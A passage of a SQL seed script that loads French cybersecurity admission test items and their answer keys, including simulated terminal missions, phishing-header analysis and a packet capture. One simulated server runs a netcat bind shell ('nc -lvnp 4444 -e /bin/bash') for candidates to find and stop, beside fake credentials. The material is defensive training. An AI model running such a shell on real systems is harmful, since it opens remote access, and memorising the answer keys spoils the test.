ur":16,"expected":"allow"},{"id":"h15","label":"","src_ip":"77.136.4.1","dst_port":80,"protocol":"tcp","country":"FR","hour":20,"expected":"allow"},{"id":"h16","label":"","src_ip":"100.64.0.1","dst_port":22,"protocol":"tcp","country":"FR","hour":8,"expected":"block"}]}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sokoban', $q$Poussez toutes les caisses sur les cibles. On ne peut que pousser une caisse, pas la tirer. Flèches du clavier ou boutons ; « Annuler » revient d'un coup en arrière. Trois niveaux, du plus simple au plus difficile.$q$, $q${"levels":[{"map":"#######\n#  .  #\n#  $  #\n# @   #\n#######","par":4},{"map":"######\n#    #\n# $$ #\n#.@ .#\n#    #\n######","par":16},{"map":"########\n#  .   #\n# $##$ #\n#  @ . #\n########","par":20}],"help":true}$q$::jsonb, 3, $q$Logique et raisonnement (activité)$q$, 360, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Que signifie « stocker ses fichiers dans le cloud » ?$q$, $q$[{"id":"c7a","text":"Les garder sur une clé USB"},{"id":"c7b","text":"Les envoyer sur des serveurs d'une entreprise, accessibles par Internet"},{"id":"c7c","text":"Les supprimer définitivement"},{"id":"c7d","text":"Les imprimer"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Le cloud, ce sont les ordinateurs (serveurs) de quelqu'un d'autre, auxquels on accède par Internet.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c7b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Quel est le rôle d'une adresse IP ?$q$, $q$[{"id":"c8a","text":"Identifier une machine sur un réseau"},{"id":"c8b","text":"Protéger un compte par un mot de passe"},{"id":"c8c","text":"Accélérer la connexion"},{"id":"c8d","text":"Afficher les pages web"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Comme une adresse postale, l'adresse IP permet aux données de trouver la bonne machine.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c8a"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Alan Turing est célèbre pour :$q$, $q$[{"id":"c9a","text":"Avoir créé Facebook"},{"id":"c9b","text":"Ses travaux fondateurs de l'informatique et le décryptage d'Enigma pendant la Seconde Guerre mondiale"},{"id":"c9c","text":"Avoir inventé le Wi-Fi"},{"id":"c9d","text":"Avoir fondé Apple"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Alan Turing est l'un des pères de l'informatique ; son équipe a cassé le chiffrement allemand Enigma.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c9b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$D'où vient le mot « bug » en informatique ?$q$, $q$[{"id":"c10a","text":"D'un insecte retrouvé coincé dans un ordinateur en 1947"},{"id":"c10b","text":"D'un logiciel appelé Bug"},{"id":"c10c","text":"Du nom d'un pirate"},{"id":"c10d","text":"D'une marque de clavier"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$En 1947, l'équipe de Grace Hopper a trouvé un papillon de nuit coincé dans le calculateur Mark II et l'a noté comme premier « bug ».$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c10a"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_multi', $q$Cochez les bons réflexes face à un mail qui vous demande votre mot de passe (plusieurs réponses) :$q$, $q$[{"id":"c11a","text":"Cliquer vite pour ne pas perdre son compte"},{"id":"c11b","text":"Vérifier l'adresse de l'expéditeur"},{"id":"c11c","text":"Aller sur le site en tapant soi-même son adresse"},{"id":"c11d","text":"Répondre avec son mot de passe"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Un service sérieux ne demande jamais votre mot de passe par mail. On vérifie l'expéditeur et on passe par le site officiel.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c11b","c11c"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Qu'est-ce qu'un « hacker éthique » ?$q$, $q$[{"id":"c12a","text":"Un pirate qui vole des données"},{"id":"c12b","text":"Un spécialiste qui cherche les failles avec l'accord de l'entreprise, pour les faire corriger"},{"id":"c12c","text":"Un logiciel antivirus"},{"id":"c12d","text":"Un réseau social"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Le hacker éthique (ou pentesteur) teste la sécurité avec autorisation, pour protéger.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c12b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Mission terminal : rangez le PC de l'accueil et débusquez le faux fichier. Toutes les commandes sont expliquées à l'écran.$q$, null, 5, $q$Fonctionnement du numérique (activité)$q$, 420, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "stagiaire",
  "hostname": "pc-accueil",
  "home": "/home/stagiaire",
  "motd": "Bienvenue sur le PC de l'accueil (terminal Linux simulé). On tape une commande, puis Entrée.\nLes commandes utiles :\n  ls                     liste ce qu'il y a ici\n  cd Telechargements     entre dans un dossier ; cd .. remonte d'un cran ; cd tout seul revient au départ\n  cat fichier            affiche un fichier\n  mkdir Images           crée un dossier\n  mv fichier dossier/    déplace un fichier ; mv *.jpg Images/ déplace tous les .jpg d'un coup\n  rm fichier             supprime un fichier\n  echo Camille > fait_par.txt   écrit « Camille » dans le fichier fait_par.txt\nCommencez par : cat LISEZMOI.txt",
  "files": {
    "/home/stagiaire/LISEZMOI.txt": "Mission : le dossier Telechargements est un vrai bazar.\n1. Créez les dossiers Images et Documents (ici, dans votre dossier personnel).\n2. Rangez les photos (.jpg) dans Images et les documents (.pdf) dans Documents.\n3. Un des fichiers se fait passer pour un PDF mais n'en est pas un : c'est un virus. Supprimez-le (ne le rangez pas !).\n4. Signez votre travail : écrivez votre prénom dans le fichier fait_par.txt.\nAstuce : la note du chef, dans Telechargements, vous aidera.\n",
    "/home/stagiaire/Telechargements/note_du_chef.txt": "Regarde bien la FIN des noms de fichiers : c'est elle qui dit ce qu'est vraiment un fichier.\nUn fichier qui finit par .exe est un programme, même s'il y a .pdf au milieu du nom.\n",
    "/home/stagiaire/Telechargements/vacances_plage.jpg": "(image JPEG)\n",
    "/home/stagiaire/Telechargements/chat_du_bde.jpg": "(image JPEG)\n",
    "/home/stagiaire/Telechargements/selfie_rentree.jpg": "(image JPEG)\n",
    "/home/stagiaire/Telechargements/cours_reseau.pdf": "(document PDF : cours de réseau)\n",
    "/home/stagiaire/Telechargements/planning_novembre.pdf": "(document PDF : planning)\n",
    "/home/stagiaire/Telechargements/facture_EDF.pdf.exe": "MZ programme Windows déguisé en facture : ne pas ouvrir.\n"
  },
  "objectives": [
    {
      "id": "dossiers",
      "title": "Créer les dossiers Images et Documents",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "exists",
            "path": "Images",
            "kind": "dir"
          },
          {
            "type": "exists",
            "path": "Documents",
            "kind": "dir"
          }
        ]
      }
    },
    {
      "id": "photos",
      "title": "Ranger les 3 photos dans Images",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "exists",
            "path": "Images/vacances_plage.jpg"
          },
          {
            "type": "absent",
            "path": "Telechargements/vacances_plage.jpg"
          },
          {
            "type": "exists",
            "path": "Images/chat_du_bde.jpg"
          },
          {
            "type": "absent",
            "path": "Telechargements/chat_du_bde.jpg"
          },
          {
            "type": "exists",
            "path": "Images/selfie_rentree.jpg"
          },
          {
            "type": "absent",
            "path": "Telechargements/selfie_rentree.jpg"
          }
        ]
      }
    },
    {
      "id": "docs",
      "title": "Ranger les 2 vrais PDF dans Documents",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "exists",
            "path": "Documents/cours_reseau.pdf"
          },
          {
            "type": "absent",
            "path": "Telechargements/cours_reseau.pdf"
          },
          {
            "type": "exists",
            "path": "Documents/planning_novembre.pdf"
          },
          {
            "type": "absent",
            "path": "Telechargements/planning_novembre.pdf"
          }
        ]
      }
    },
    {
      "id": "virus",
      "title": "Supprimer le faux PDF (le virus), sans le ranger",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "absent",
            "path": "Telechargements/facture_EDF.pdf.exe"
          },
          {
            "type": "absent",
            "path": "Documents/facture_EDF.pdf.exe"
          },
          {
            "type": "absent",
            "path": "Images/facture_EDF.pdf.exe"
          }
        ]
      }
    },
    {
      "id": "signe",
      "title": "Écrire son prénom dans fait_par.txt",
      "check": {
        "type": "exists",
        "path": "fait_par.txt",
        "kind": "file"
      }
    }
  ]
}$q$::jsonb, null);
    update tests set activity_minutes = 45, duration_minutes = 95, pass_mark = null where id = v_test;
    raise notice '% : % questions au total', $q$Admission Bachelor 1 Cybersécurité 2026$q$, (select count(*) from questions where test_id = v_test);
  end if;
  select id into v_test from tests where title = $q$Admission Bachelor 3 Cybersécurité 2026$q$ order by created_at desc limit 1;
  if v_test is null then raise notice 'Épreuve introuvable : %', $q$Admission Bachelor 3 Cybersécurité 2026$q$; else
    delete from questions where test_id = v_test and id in (select question_id from question_externals where tool = 'win95');
    delete from questions where test_id = v_test and domain like '%(activité)';
    select coalesce(max(position), 0) into v_pos from questions where test_id = v_test;
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'subnet', $q$Un poste vient d'être installé. À partir de son adresse, complétez la fiche réseau.$q$, $q${"mode":"basic","prefixes":[25,26,27,28],"ask":["network","broadcast","first","last","hosts","mask"],"help":false}$q$::jsonb, 2, $q$Réseaux (activité)$q$, 180, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'ordering', $q$Un utilisateur n'a plus Internet. Vous êtes à son poste : dans quel ordre vérifiez-vous ?$q$, $q$[{"id":"d1","text":"Le câble, le voyant de la carte réseau, le Wi-Fi activé"},{"id":"d2","text":"La configuration IP avec ipconfig (une adresse en 169.254 signale un problème de DHCP)"},{"id":"d3","text":"Un ping de la passerelle"},{"id":"d4","text":"Un ping de 8.8.8.8"},{"id":"d5","text":"Un ping d'un nom de domaine (s'il échoue alors que 8.8.8.8 répond : DNS)"}]$q$::jsonb, 2, $q$Logique et diagnostic (activité)$q$, 120, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["d1","d2","d3","d4","d5"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'headers', $q$Une utilisatrice a cliqué sur le lien de ce mail et vous l'a transféré. Avant de lancer la procédure, analysez ses en-têtes.$q$, $q${"raw":"Received: from mx.cybersup-ecole.example (mx.cybersup-ecole.example [192.0.2.25])\n        by mail.cybersup-ecole.example with ESMTPS id 7Hq2; Tue, 3 Nov 2026 08:14:09 +0100\nReceived: from relay.mailflux.example (relay.mailflux.example [198.51.100.77])\n        by mx.cybersup-ecole.example with ESMTP id 41fd; Tue, 3 Nov 2026 08:14:06 +0100\nReceived: from pc-0451 (unknown [203.0.113.45])\n        by relay.mailflux.example with SMTP id x9k2; Tue, 3 Nov 2026 08:13:21 +0100\nAuthentication-Results: mx.cybersup-ecole.example;\n       spf=fail (sender IP is 203.0.113.45) smtp.mailfrom=banque-horizon-secure.example;\n       dkim=none (message not signed);\n       dmarc=fail action=quarantine header.from=banque-horizon.example\nFrom: \"Service Client Banque Horizon\" <securite@banque-horizon.example>\nReply-To: <support-client@verif-compte-urgent.example>\nReturn-Path: <bounce@banque-horizon-secure.example>\nTo: <etudiant@cybersup-ecole.example>\nSubject: [URGENT] Votre compte sera suspendu sous 24 h\nDate: Tue, 3 Nov 2026 08:13:19 +0100\nMessage-ID: <20261103071319.4471@pc-0451>","view":"raw","ask":["origin_ip","spf","dkim","reply_to","verdict"],"help":false,"body":"Cher client,\n\nNous avons détecté une activité inhabituelle sur votre compte. Sans vérification de votre part dans les 24 heures, votre compte sera suspendu et vos cartes bloquées.\n\nMerci de confirmer votre identité en cliquant sur le bouton ci-dessous.\n\nLe service client Banque Horizon","button":{"label":"Vérifier mon compte","url":"https://banque-horizon.verif-compte-urgent.example/connexion"}}$q$::jsonb, 2, $q$Cybersécurité (activité)$q$, 240, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"origin_ip":"203.0.113.45","spf":"fail","reply_to":"oui","verdict":"phishing","dkim":"none"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'adsim', $q$Vous êtes administrateur du domaine ecole.local. Traitez les demandes du jour dans la console Active Directory.$q$, $q${"initial":{"domain":"ecole.local","ous":[{"id":"ou-ecole","name":"Ecole","parent":null},{"id":"ou-users","name":"Utilisateurs","parent":"ou-ecole"},{"id":"ou-compta","name":"Comptabilité","parent":"ou-users"},{"id":"ou-peda","name":"Pédagogie","parent":"ou-users"},{"id":"ou-dir","name":"Direction","parent":"ou-users"},{"id":"ou-pc","name":"Ordinateurs","parent":"ou-ecole"},{"id":"ou-anciens","name":"Anciens collaborateurs","parent":"ou-ecole"},{"id":"ou-groupes","name":"Groupes","parent":"ou-ecole"}],"users":[{"sam":"m.durand","name":"Marie Durand","ou":"ou-compta","enabled":true,"groups":["GG_Compta"]},{"sam":"k.martin","name":"Kevin Martin","ou":"ou-compta","enabled":true,"groups":["GG_Compta","GG_VPN"]},{"sam":"s.leroy","name":"Sophie Leroy","ou":"ou-peda","enabled":true,"groups":["GG_Pedagogie"]},{"sam":"t.stagiaire","name":"Tom Stagiaire","ou":"ou-peda","enabled":true,"groups":["GG_Pedagogie","GG_Admins_Locaux"]},{"sam":"a.benali","name":"Amine Benali","ou":"ou-dir","enabled":true,"groups":["GG_Direction","GG_VPN"]}],"groups":[{"name":"GG_Compta","ou":"ou-groupes"},{"name":"GG_Pedagogie","ou":"ou-groupes"},{"name":"GG_Direction","ou":"ou-groupes"},{"name":"GG_VPN","ou":"ou-groupes"},{"name":"GG_Admins_Locaux","ou":"ou-groupes"}],"gpos":[{"name":"Fond d'écran de l'école","links":["ou-ecole"]},{"name":"Verrouillage de l'écran après 10 min","links":["ou-users"]},{"name":"Lecteur réseau Compta (S:)","links":[]}]},"help":false,"tasks":["Créez le compte de Julie Martin (identifiant j.martin) dans l'OU Comptabilité, avec un mot de passe à changer à la première connexion.","Donnez-lui accès au partage de la comptabilité (groupe GG_Compta) et au VPN (groupe GG_VPN).","Kevin Martin (k.martin) quitte l'école : désactivez son compte et rangez-le dans l'OU Anciens collaborateurs. Ne le supprimez pas.","Le stagiaire t.stagiaire ne doit pas être administrateur des postes : retirez-le du groupe GG_Admins_Locaux.","La GPO « Lecteur réseau Compta (S:) » doit s'appliquer aux seuls utilisateurs de la comptabilité : liez-la à la bonne OU."]}$q$::jsonb, 4, $q$Systèmes (activité)$q$, 480, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"checks":[{"kind":"exists","sam":"j.martin"},{"kind":"user_in_ou","sam":"j.martin","ou":"ou-compta"},{"kind":"must_change","sam":"j.martin"},{"kind":"in_group","sam":"j.martin","group":"GG_Compta"},{"kind":"in_group","sam":"j.martin","group":"GG_VPN"},{"kind":"disabled","sam":"k.martin"},{"kind":"user_in_ou","sam":"k.martin","ou":"ou-anciens"},{"kind":"not_in_group","sam":"t.stagiaire","group":"GG_Admins_Locaux"},{"kind":"gpo_linked","gpo":"Lecteur réseau Compta (S:)","ou":"ou-compta"},{"kind":"enabled","sam":"m.durand"},{"kind":"in_group","sam":"m.durand","group":"GG_Compta"}]}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'tickets', $q$Vous arrivez au support à 9 h 15 : six tickets attendent. Pour chacun, indiquez l'impact, l'urgence et le groupe qui doit le traiter. La priorité se calcule toute seule, comme dans GLPI.$q$, $q${"help":false,"groups":["Support poste de travail (N1)","Réseau et infrastructure (N2)","Sécurité (RSSI)","Applications métier"],"tickets":[{"id":"t1","title":"Plus aucun mail","from":"Accueil","text":"Depuis 9 h, personne dans l'école ne reçoit ni n'envoie de mails."},{"id":"t2","title":"J'ai cliqué sur un lien","from":"Comptabilité","text":"J'ai cliqué sur le lien d'un mail « Microsoft » et j'ai tapé mon mot de passe. Depuis, j'ai des alertes de connexion."},{"id":"t3","title":"Touche qui accroche","from":"Pédagogie","text":"La touche E de mon clavier accroche un peu, ce n'est pas urgent."},{"id":"t4","title":"Imprimante du 2e étage","from":"Direction","text":"L'imprimante du 2e étage ne marche plus. Celle du 1er étage fonctionne."},{"id":"t5","title":"Export de la paie en erreur","from":"Comptabilité","text":"Le logiciel de paie affiche une erreur à l'export. Les virements doivent partir demain matin."},{"id":"t6","title":"Wi-Fi lent en B12","from":"Pédagogie","text":"Le Wi-Fi est très lent dans la salle B12 pendant les cours, les étudiants n'arrivent pas à charger leurs exercices."}]}$q$::jsonb, 3, $q$Logique et diagnostic (activité)$q$, 300, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"t1":{"impact":"haute","urgence":"haute","groupe":"Réseau et infrastructure (N2)"},"t2":{"impact":"haute","urgence":"haute","groupe":"Sécurité (RSSI)"},"t3":{"impact":"basse","urgence":"basse","groupe":"Support poste de travail (N1)"},"t4":{"impact":"moyenne","urgence":"basse","groupe":"Support poste de travail (N1)"},"t5":{"impact":"moyenne","urgence":"haute","groupe":"Applications métier"},"t6":{"impact":"moyenne","urgence":"moyenne","groupe":"Réseau et infrastructure (N2)"}}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Mission terminal : le site de l'école est en panne. Traitez le ticket sur le serveur web, proprement (sauvegarde avant modification).$q$, null, 4, $q$Systèmes (activité)$q$, 600, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "tech",
  "hostname": "srv-web",
  "home": "/home/tech",
  "motd": "Connexion SSH à srv-web (Debian 12). Un ticket vous attend : cat TICKET-2047.txt\nAide-mémoire :\n  ls /var/log/apache2/                 voir les journaux d'Apache, puis cat pour les lire\n  mkdir dossier · cp fichier dossier/  sauvegarder une copie\n  sudo sed -i 's/ancien/nouveau/' f    remplacer un mot dans un fichier (en root)\n  sudo chmod 640 fichier              changer les droits\n  ss -tlnp · ps aux · sudo kill PID   voir ce qui écoute ou tourne, arrêter un programme\nsudo -l liste ce que vous pouvez faire en root ; help liste toutes les commandes.",
  "files": {
    "/home/tech/TICKET-2047.txt": "TICKET #2047 · Priorité haute · Demandeur : service communication\n\nLe site www.ecole.example ne s'affiche plus depuis la mise à jour de ce matin.\n\nÀ faire :\n1. Trouver la cause dans le journal d'erreurs d'Apache (/var/log/apache2/).\n2. AVANT de modifier quoi que ce soit, sauvegarder le fichier de configuration du site dans ~/sauvegardes/.\n3. Corriger la configuration.\n4. Au passage, l'audit de la semaine dernière signalait que le fichier de configuration PHP du site\n   (qui contient le mot de passe de la base) est lisible par tout le monde : droits à passer en 640.\n5. L'audit signalait aussi un programme qui écoute sur un port inhabituel (ss -tlnp) : à arrêter.\n",
    "/var/log/apache2/error.log": "[Tue Nov 03 06:58:02 2026] [notice] caught SIGTERM, shutting down\n[Tue Nov 03 07:02:11 2026] [error] AH00526: Syntax error on line 4 of /etc/apache2/sites-enabled/ecole.conf:\n[Tue Nov 03 07:02:11 2026] [error] Invalid command 'DocumentRot', perhaps misspelled or defined by a module not included in the server configuration\n[Tue Nov 03 07:02:11 2026] [error] Action 'start' failed.\n",
    "/var/log/apache2/access.log": "10.0.0.31 - - [02/Nov/2026:17:12:03 +0100] \"GET / HTTP/1.1\" 200 5120\n10.0.0.44 - - [02/Nov/2026:17:15:40 +0100] \"GET /inscriptions HTTP/1.1\" 200 8210\n",
    "/etc/apache2/sites-enabled/ecole.conf": {
      "content": "<VirtualHost *:80>\n    ServerName www.ecole.example\n    ServerAdmin webmaster@ecole.example\n    DocumentRot /var/www/ecole\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n</VirtualHost>\n",
      "owner": "root",
      "mode": "644"
    },
    "/etc/apache2/apache2.conf": {
      "content": "# Configuration principale d'Apache\nIncludeOptional sites-enabled/*.conf\n",
      "owner": "root",
      "mode": "644"
    },
    "/var/www/ecole/index.php": {
      "content": "<?php require 'config.php'; echo 'Bienvenue sur le site de l\\'école'; ?>\n",
      "owner": "www-data",
      "mode": "644"
    },
    "/var/www/ecole/config.php": {
      "content": "<?php\n$db_host = '10.0.0.12';\n$db_user = 'site_ecole';\n$db_pass = 'Ecole!2026-prod';\n",
      "owner": "www-data",
      "mode": "644"
    }
  },
  "processes": [
    {
      "pid": 1,
      "user": "root",
      "cmd": "/sbin/init",
      "cpu": 0.1
    },
    {
      "pid": 455,
      "user": "root",
      "cmd": "/usr/sbin/sshd -D",
      "cpu": 0
    },
    {
      "pid": 2231,
      "user": "www-data",
      "cmd": "nc -lvnp 4444 -e /bin/bash",
      "cpu": 0,
      "mem": 0.1
    },
    {
      "pid": 2604,
      "cmd": "-bash",
      "cpu": 0
    }
  ],
  "listen": [
    {
      "port": 22,
      "process": "sshd"
    },
    {
      "port": 4444,
      "process": "nc"
    }
  ],
  "sudo": [
    "sed",
    "chmod",
    "kill",
    "cp",
    "cat",
    "ls"
  ],
  "objectives": [
    {
      "id": "sauvegarde",
      "title": "Sauvegarder la configuration d'origine dans ~/sauvegardes/",
      "check": {
        "type": "contains",
        "path": "sauvegardes/ecole.conf",
        "text": "DocumentRot /var/www/ecole"
      }
    },
    {
      "id": "correction",
      "title": "Corriger l'erreur de configuration du site",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "contains",
            "path": "/etc/apache2/sites-enabled/ecole.conf",
            "text": "    DocumentRoot /var/www/ecole"
          },
          {
            "type": "contains",
            "path": "/etc/apache2/sites-enabled/ecole.conf",
            "text": "ServerName www.ecole.example"
          }
        ]
      }
    },
    {
      "id": "droits",
      "title": "Passer config.php en 640",
      "check": {
        "type": "mode",
        "path": "/var/www/ecole/config.php",
        "mode": "640"
      }
    },
    {
      "id": "porte",
      "title": "Arrêter le programme qui écoute sur le port inhabituel",
      "check": {
        "type": "process_absent",
        "name": "nc -lvnp"
      }
    }
  ]
}$q$::jsonb, null);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sim', $q$Ticket #2063 : le premier étage vient d'être recâblé et plus rien ne marche. Brassez chaque prise murale vers un port du switch SW-ETAGE1 qui appartient au bon VLAN, d'après la documentation du switch. Un port ne reçoit qu'un seul câble, et le port 24 (liaison montante) ne doit pas être utilisé.$q$, $q${"kind":"patch","help":false,"vlans":[{"id":10,"name":"VLAN 10 · Comptabilité","color":"#3b82f6"},{"id":20,"name":"VLAN 20 · Pédagogie","color":"#22c55e"},{"id":30,"name":"VLAN 30 · Téléphonie IP","color":"#a855f7"},{"id":99,"name":"VLAN 99 · Wi-Fi invités","color":"#f59e0b"}],"ports":[{"n":1,"vlan":10},{"n":2,"vlan":10},{"n":3,"vlan":10},{"n":4,"vlan":10},{"n":5,"vlan":10},{"n":6,"vlan":10},{"n":7,"vlan":20},{"n":8,"vlan":20},{"n":9,"vlan":20},{"n":10,"vlan":20},{"n":11,"vlan":20},{"n":12,"vlan":20},{"n":13,"vlan":30},{"n":14,"vlan":30},{"n":15,"vlan":30},{"n":16,"vlan":30},{"n":17,"vlan":99},{"n":18,"vlan":99},{"n":19,"vlan":99},{"n":20,"vlan":99},{"n":21,"vlan":20},{"n":22,"vlan":20},{"n":23,"vlan":20},{"n":24,"vlan":"trunk"}],"plugs":[{"id":"B101-1","label":"B101-1","device":"PC de la comptable","vlan":10},{"id":"B101-2","label":"B101-2","device":"Téléphone IP de la compta","vlan":30},{"id":"B102-1","label":"B102-1","device":"PC du formateur, salle B102","vlan":20},{"id":"B102-2","label":"B102-2","device":"Vidéoprojecteur, salle B102","vlan":20},{"id":"B103-1","label":"B103-1","device":"Imprimante de la compta","vlan":10},{"id":"ACC-1","label":"ACC-1","device":"Borne Wi-Fi invités, accueil","vlan":99},{"id":"ACC-2","label":"ACC-2","device":"Téléphone IP de l'accueil","vlan":30}]}$q$::jsonb, 4, $q$Réseaux (activité)$q$, 420, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sim', $q$Le RSSI a capturé le trafic du poste de la comptabilité (10.0.10.23) pendant qu'il envoie le fichier de paie au prestataire. Analysez la capture : filtrez, ouvrez les paquets, suivez le flux, puis répondez.$q$, $q${"kind":"pcap","help":false,"file":"poste-compta.pcapng","packets":[{"no":1,"t":"0.000000","src":"10.0.10.23","dst":"10.0.10.1","proto":"ARP","len":42,"info":"Who has 10.0.10.1? Tell 10.0.10.23"},{"no":2,"t":"0.000412","src":"10.0.10.1","dst":"10.0.10.23","proto":"ARP","len":60,"info":"10.0.10.1 is at 00:1a:2b:3c:4d:5e"},{"no":3,"t":"0.010220","src":"10.0.10.23","dst":"10.0.0.53","proto":"DNS","len":78,"info":"Standard query 0x4f1a A ftp.prestataire-paie.example","details":["Domain Name System (query)","    Queries: ftp.prestataire-paie.example: type A, class IN"]},{"no":4,"t":"0.031877","src":"10.0.0.53","dst":"10.0.10.23","proto":"DNS","len":94,"info":"Standard query response 0x4f1a A 203.0.113.80","details":["Domain Name System (response)","    Answers: ftp.prestataire-paie.example: type A, addr 203.0.113.80"]},{"no":5,"t":"0.032400","src":"10.0.10.23","dst":"203.0.113.80","proto":"TCP","len":66,"info":"51544 → 21 [SYN] Seq=0 Win=64240","details":["Transmission Control Protocol, Src Port: 51544, Dst Port: 21"],"stream":1},{"no":6,"t":"0.051002","src":"203.0.113.80","dst":"10.0.10.23","proto":"TCP","len":66,"info":"21 → 51544 [SYN, ACK] Seq=0 Ack=1","stream":1},{"no":7,"t":"0.051300","src":"10.0.10.23","dst":"203.0.113.80","proto":"TCP","len":54,"info":"51544 → 21 [ACK] Seq=1 Ack=1","stream":1},{"no":8,"t":"0.072115","src":"203.0.113.80","dst":"10.0.10.23","proto":"FTP","len":117,"info":"Response: 220 Bienvenue sur le serveur FTP du prestataire","details":["Transmission Control Protocol, Src: 203.0.113.80, Dst: 10.0.10.23","File Transfer Protocol (FTP)","    Response: 220 Bienvenue sur le serveur FTP du prestataire\\r\\n"],"stream":1},{"no":9,"t":"0.080011","src":"10.0.10.23","dst":"142.250.75.238","proto":"TLSv1.3","len":571,"info":"Client Hello (SNI=www.google.com)","details":["Transport Layer Security","    Handshake Protocol: Client Hello","    Contenu chiffré : illisible"]},{"no":10,"t":"0.081930","src":"10.0.10.23","dst":"203.0.113.80","proto":"FTP","len":86,"info":"Request: USER compta.ecole","details":["Transmission Control Protocol, Src: 10.0.10.23, Dst: 203.0.113.80","File Transfer Protocol (FTP)","    Request: USER compta.ecole\\r\\n"],"stream":1},{"no":11,"t":"0.101245","src":"203.0.113.80","dst":"10.0.10.23","proto":"FTP","len":108,"info":"Response: 331 Password required for compta.ecole","details":["Transmission Control Protocol, Src: 203.0.113.80, Dst: 10.0.10.23","File Transfer Protocol (FTP)","    Response: 331 Password required for compta.ecole\\r\\n"],"stream":1},{"no":12,"t":"0.102877","src":"10.0.10.23","dst":"203.0.113.80","proto":"FTP","len":89,"info":"Request: PASS Paie#Novembre26","details":["Transmission Control Protocol, Src: 10.0.10.23, Dst: 203.0.113.80","File Transfer Protocol (FTP)","    Request: PASS Paie#Novembre26\\r\\n"],"stream":1},{"no":13,"t":"0.130554","src":"203.0.113.80","dst":"10.0.10.23","proto":"FTP","len":101,"info":"Response: 230 User compta.ecole logged in","details":["Transmission Control Protocol, Src: 203.0.113.80, Dst: 10.0.10.23","File Transfer Protocol (FTP)","    Response: 230 User compta.ecole logged in\\r\\n"],"stream":1},{"no":14,"t":"0.131002","src":"10.0.10.23","dst":"142.250.75.238","proto":"TLSv1.3","len":1290,"info":"Application Data","details":["Transport Layer Security","    Application Data Protocol: Contenu chiffré"]},{"no":15,"t":"0.140301","src":"10.0.10.23","dst":"203.0.113.80","proto":"FTP","len":97,"info":"Request: STOR paie_novembre_2026.xlsx","details":["Transmission Control Protocol, Src: 10.0.10.23, Dst: 203.0.113.80","File Transfer Protocol (FTP)","    Request: STOR 